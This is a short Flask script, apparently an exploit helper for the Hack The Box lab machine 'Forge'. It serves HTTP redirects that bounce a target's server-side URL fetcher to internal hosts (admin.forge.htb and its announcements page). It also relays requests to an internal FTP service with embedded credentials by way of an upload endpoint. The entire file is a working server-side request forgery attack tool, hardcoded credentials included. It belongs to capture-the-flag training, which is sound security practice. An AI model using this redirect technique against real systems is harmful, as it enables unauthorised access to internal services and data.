from flask import Flask,redirect,request

app = Flask(__name__)

@app.route('/',)
def redirectToAdmin():
    return redirect("http://admin.forge.htb/") #Seting Redirect Http Header

@app.route('/announcements')
def redirectToAnnouncements():
    return redirect("http://admin.forge.htb/announcements") #Seting Redirect Http Header

@app.route('/ftp')
def redirectToftp():
    return redirect("ftp://user:heightofsecurity123!@127.0.0.1") #not supported


@app.route('/ftp2')
def redirectToftp2():
    path = request.args.get('path',default='')
    return redirect(f"http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/{path}") 

app.run(debug=True,host='0.0.0.0',port=80)
